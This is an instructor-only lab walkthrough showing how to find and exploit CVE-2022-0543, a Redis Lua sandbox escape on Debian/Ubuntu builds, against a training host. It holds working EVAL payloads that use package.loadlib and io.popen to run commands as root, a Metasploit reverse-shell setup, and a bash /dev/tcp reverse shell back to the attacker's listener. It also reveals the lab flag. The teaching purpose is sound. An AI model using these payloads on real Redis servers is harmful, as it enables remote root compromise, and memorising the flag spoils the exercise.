---
id: B02.M08-walkthrough
title: Charlotte — Instructor Walkthrough
artifact_type: activity_walkthrough
audience: instructor
block: B02
module_type: lab
legacy_aliases:
- legacy/week2/labs/pcte_vulnhub_targets/walkthroughs/08-target8-redis-lua-rce.md
source_kind: markdown
render_mode: generate
source_status: authored
review_required: false
output_formats:
- docx
- pdf
sensitivity: instructor_only
references:
- path: ./answer-key.md
---

# Charlotte — Instructor Walkthrough

## Objective and starting context

Live instructor demo for the Charlotte Module (`B02.M08`). Students know only the assigned subnet `192.168.17.0/24`. Do not open with the product name, CVE, or host IP.

This walkthrough is rewritten onto the `192.168.17.0/24` student-facing range. Example host addresses in later steps use the `.10` (and, where present, `.11`) convention from the shared stack; treat those as discovered values, not pre-briefed facts.

The deploy flag key is `T8_FLAG`. Confirm the live `.env` value before grading.


## Required Tools
* `iproute2` (for adding static routes when your host has no path to the target subnet)
* `nmap` (for host discovery and port scanning)
* `redis-cli` (Redis command-line client — `PING`, `INFO`, `EVAL`)
* `nc` (Netcat, for catching the reverse shell in section 5B)
* `metasploit-framework` (section 4 automated path via `exploit/linux/redis/redis_debian_sandbox_escape`)

## 1. Network Routing & Host Discovery

At the start of this scenario, we only know the target subnet: `192.168.17.0/24`. We are positioned on the external lab network (`192.168.100.0/24`).

If your host does not already have a route into that Class C, add one via the lab router (address and path vary by deployment):

```bash
sudo ip route add 192.168.17.0/24 via 192.168.100.254
```

With connectivity available, find which addresses on the subnet actually answer. `nmap -sn` is a ping sweep: it checks host up/down and **does not** port-scan. That is cheaper than a full TCP scan of every IP, and we only have a subnet so far — we still need a live host before we care about services.

```bash
nmap -sn 192.168.17.0/24
```

*Output excerpt:*
```text
Nmap scan report for 192.168.17.10
Host is up (0.000018s latency).
```

**Observation:** One live host responds on this subnet: **192.168.17.10**.

**Inference:** Concentrate service enumeration on that address.

## 2. Service Enumeration

We have a candidate IP. Next question: **what is listening, and what does it claim to be?** That takes a version scan, not another ping sweep.

```bash
nmap -Pn -sV -p- 192.168.17.10
```

*Why these options:*

* `-Pn` — skip nmap’s host-discovery probes. We already know `192.168.17.10` responded to `-sn`. This also keeps the scan going if the host later ignores ping but still serves TCP.
* `-sV` — version detection. An open port labeled only `redis` is weaker than a version string (here, **Redis 5.0.7**).
* `-p-` — all 65535 TCP ports, not nmap’s default top 1000. A single missed listener would hide the whole attack surface. On this host the extra cost is small.

*Output excerpt:*
```text
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```

**Observation:** A single open port — **6379/tcp** — fingerprinted as **Redis 5.0.7**.

**Inference:** Port 6379 is Redis’s default listen port ([redis.conf `port 6379`](https://redis.io/docs/management/config/)). This is not HTTP. Talk to it with the Redis client, not `curl`. Read that client’s usage **before** sending commands.

### `redis-cli` usage (read this first)

Kali ships `redis-cli`. Its help page is how we know `-h` is the **server hostname** (easy to confuse with curl’s `-h` / `--help`). Extra arguments after the options are Redis commands.

```bash
redis-cli --help
```

*Excerpt (the lines we use):*
```text
Usage: redis-cli [OPTIONS] [cmd [arg [arg ...]]]
  -h <hostname>      Server hostname (default: 127.0.0.1).
  -p <port>          Server port (default: 6379).
  -a <password>      Password to use when connecting to the server.
```

**What that means here:** `-h 192.168.17.10` is the target we just found. Port defaults to **6379**, which matches nmap, so we can omit `-p`. There is no `-a` until something asks for `AUTH`. Commands such as `PING` and `INFO` are documented in the Redis command reference ([PING](https://redis.io/commands/ping/), [INFO](https://redis.io/commands/info/)) — they are not lab-specific flags.

### Initial Redis probing

`PING` is the documented health check: if the server answers `PONG` with no `-NOAUTH`, we have an unauthenticated client.

```bash
redis-cli -h 192.168.17.10 ping
```

*Output:*
```text
PONG
```

**Observation:** `PING` returns `PONG` with no `AUTH` challenge.

**Inference:** The instance accepts unauthenticated clients. `INFO server` (same command reference, [INFO](https://redis.io/commands/info/)) dumps version, OS, build id, and config path so we can tell a packaged Debian/Ubuntu Redis from a generic upstream binary.

```bash
redis-cli -h 192.168.17.10 INFO server
```

*Output:*
```text
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:636cde3b5c7a3923
redis_mode:standalone
os:Linux 7.0.0-27-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.2.1
process_id:1
run_id:501ff8ad90fe8238d579320022ce6c8f79e2cfd8
tcp_port:6379
uptime_in_seconds:5668
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:5145954
executable:/redis-server
config_file:/etc/redis/redis.conf
```

From that response:

* **Redis 5.0.7** (`redis_version`)
* **`redis_build_id:636cde3b5c7a3923`** — stock Ubuntu **20.04** `redis-server` 5.0.7 package fingerprint (same id appears in Ubuntu 20.04 Redis examples, e.g. [redis#8443](https://github.com/redis/redis/issues/8443))
* Listening on **6379** (`tcp_port`)
* **Linux x86_64** (`os`, `arch_bits`)
* Config path **`/etc/redis/redis.conf`** (packaged layout, not a random upstream binary)

**Observation:** Unauthenticated **and** Ubuntu 20.04 packaged Redis 5.0.7 (`build_id` + `/etc/redis/redis.conf`).

**Inference:** Unauthenticated Redis has several historically abused surfaces (CONFIG/file write, rogue replication, `MODULE LOAD`, Lua `EVAL`). With an **Ubuntu-packaged** build, search the packaging fingerprint first: `redis 636cde3b5c7a3923 cve` or `Redis 5.0.7 Ubuntu 20.04 Lua sandbox`. Those queries surface **CVE-2022-0543**, a Debian/Ubuntu Lua sandbox escape — not a bug in upstream Redis itself.

## 3. Vulnerability Discovery

We now know:

* Unauthenticated **Redis 5.0.7** on **6379**
* **`redis_build_id:636cde3b5c7a3923`** → Ubuntu 20.04 packaged `redis-server`
* Public search from that build id points at **CVE-2022-0543**

**What the bug is:** Debian/Ubuntu dynamically link Lua and leave the Lua global **`package`** table populated inside `EVAL`. A tight upstream sandbox hides `package`. With it present, attacker Lua can call `package.loadlib()` and reach `io.popen()` ([Reginaldo Silva](https://ubercomp.com/posts/2022-01-20_redis_on_debian_rce); [Debian #1005787](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1005787); [NVD CVE-2022-0543](https://nvd.nist.gov/vuln/detail/CVE-2022-0543)). Vulhub’s notes and PoC Lua live in `vulnhub/redis/CVE-2022-0543/README.md`.

**Candidate selection:** Prove this sandbox leak (`os` blocked, `package` present) before Metasploit or a reverse shell. Older Redis replication/`MODULE LOAD` tricks are a different class of bug.

### `EVAL` — where the redis-cli syntax comes from

`EVAL` is a stock Redis command: [EVAL](https://redis.io/commands/eval/). The documented form is:

```text
EVAL script numkeys [key [key ...]] [arg [arg ...]]
```

`numkeys` is how many of the following arguments are `KEYS`. We are not passing Redis keys, only a Lua snippet, so **`numkeys` is `0`**. That trailing `0` is required by the command spec — it is not a lab token.

`redis-cli --help` already showed `[cmd [arg ...]]`, so:

```text
redis-cli -h <host> EVAL '<lua>' 0
```

is `EVAL` + script + `numkeys=0`, the same as typing `EVAL` in `redis-cli` interactive mode.

Harmless check that Lua runs (Silva/Vulhub start from `EVAL` as well):

```bash
redis-cli -h 192.168.17.10 EVAL 'return 1+1' 0
```

*`EVAL` vs `eval`:* Redis commands are case-insensitive. The walkthrough uses `EVAL` to match the docs; lowercase `eval` works the same.

*Output:*
```text
2
```

**Observation:** Lua evaluation works.

A tight sandbox should hide both `os` and `package`. Silva’s write-up uses exactly this contrast: `os` is gone, **`package` is not**.

```bash
redis-cli -h 192.168.17.10 EVAL 'return type(os)' 0
```

*Output excerpt:*
```text
ERR Error running script ... Script attempted to access nonexistent global variable 'os'
```

```bash
redis-cli -h 192.168.17.10 EVAL 'return type(package)' 0
```

*Output:*
```text
table
```

**Observation:** `os` is blocked; `type(package)` returns `table`.

**Inference:** This is the CVE-2022-0543 packaging failure, not “Redis with no AUTH” in general. Command execution is `package.loadlib` + `io.popen` from the same public PoC (section 5A). Metasploit (section 4) wraps that Lua for you.

## 4. Automated Path: Metasploit

Product + confirmed leaky Lua `package` table is enough to search Metasploit:

```text
msf6 > search redis_debian_sandbox_escape

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/linux/redis/redis_debian_sandbox_escape  2022-02-18       excellent  Yes    Redis Lua Sandbox Escape
```

(The same module is findable with `search cve:2022-0543`.) Default payload is already `cmd/unix/reverse_bash`. This instance has no `AUTH` — `unset PASSWORD`. `LUA_LIB` defaults to the Debian/Ubuntu amd64 library used in Silva/Vulhub (`/usr/lib/x86_64-linux-gnu/liblua5.1.so.0`).

```bash
msfconsole -q
```

```text
msf6 > use exploit/linux/redis/redis_debian_sandbox_escape
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set RHOSTS 192.168.17.10
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set RPORT 6379
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > unset PASSWORD
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set LUA_LIB /usr/lib/x86_64-linux-gnu/liblua5.1.so.0
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set LHOST 192.168.100.1
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set LPORT 4444
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set TARGET 0
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set PAYLOAD cmd/unix/reverse_bash
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > run
```

*Output excerpt:*
```text
[*] Started reverse TCP handler on 192.168.100.1:4444
[+] The target is vulnerable.
[*] Command shell session 1 opened (192.168.100.1:4444 -> 192.168.17.10:xxxxx)
```

In the session:

```bash
id
cat /flag.txt
```

*Output:*
```text
uid=0(root) gid=0(root) groups=0(root)
azure-jackal
```

That is a complete automated path to the flag. Section 5 is the same Lua without Metasploit.

## 5. Manual Path: `EVAL` + `package.loadlib`

The Lua is **not** a second unpublished exploit. It is the PoC from Silva’s post and the Vulhub README (`vulnhub/redis/CVE-2022-0543/README.md`): load Debian’s `liblua5.1.so.0`, open the `io` library, `popen` a shell command. Metasploit’s `LUA_LIB` is that same path. Debian/Ubuntu amd64 puts the library at `/usr/lib/x86_64-linux-gnu/liblua5.1.so.0` (multiarch). A guess like `/usr/lib/liblua.so` returns nil and the script dies.

`EVAL` / `numkeys=0` is still the Redis command spec from section 3.

### 5A. Non-shell (command output over `EVAL`)

Load the library and confirm `luaopen_io` is a function (first lines of the public PoC):

```bash
redis-cli -h 192.168.17.10 EVAL \
  'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); return type(io_l)' \
  0
```

*Output:*
```text
function
```

**Observation:** `loadlib` returned a callable opener.

**Inference:** Native Lua I/O is reachable. The rest of the PoC is `io_l()`, then `io.popen("id", "r")`, read stdout, return it to `EVAL`.

```lua
local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io");
local io = io_l();
local f = io.popen("id", "r");
local res = f:read("*a");
f:close();
return res
```

```bash
redis-cli -h 192.168.17.10 EVAL \
  'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' \
  0
```

*Output:*
```text
uid=0(root) gid=0(root) groups=0(root)
```

**Observation:** `id` ran as **root** inside the Redis process. Output came back on the `EVAL` reply — no listener required.

Same primitive for the flag (`popen` argument is just another command):

```bash
redis-cli -h 192.168.17.10 EVAL \
  'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /flag.txt", "r"); local res = f:read("*a"); f:close(); return res' \
  0
```

*Output:*
```text
azure-jackal
```

Use 5A when you only need command output (or outbound callbacks are blocked). Use 5B when you want an interactive shell.

### 5B. Reverse shell

Same `loadlib` / `popen` PoC; `popen` runs bash to your listener instead of `id`. Redis still runs as **root** in this container.

Start a Netcat listener (lab-facing IP; example `192.168.100.1`):

```bash
nc -lvnp 4444
```

`nc -l` listen, `-v` verbose, `-n` numeric addresses, `-p 4444` port.

The public PoC does not background the process. If `popen` waits for bash to exit, `redis-cli` hangs even after Netcat connects. Append `&` inside the shell command so `EVAL` returns.

```bash
LHOST="192.168.100.1"
LPORT="4444"

redis-cli -h 192.168.17.10 EVAL \
  "local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io'); local io = io_l(); io.popen('bash -c \"bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1 &\"'); return 'sent'" \
  0
```

Outer double quotes so `$LHOST` / `$LPORT` expand on **your** Kali. Inner `\"` protects the bash `-c` string. That quoting is local shell mechanics, not Redis.

*Listener excerpt:*
```text
listening on [any] 4444 ...
connect to [192.168.100.1] from (UNKNOWN) [192.168.17.10] 47928
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@1925eeec640d:/var/lib/redis#
```

```bash
cat /flag.txt
```

*Output:*
```text
azure-jackal
```

Target 8 is complete.
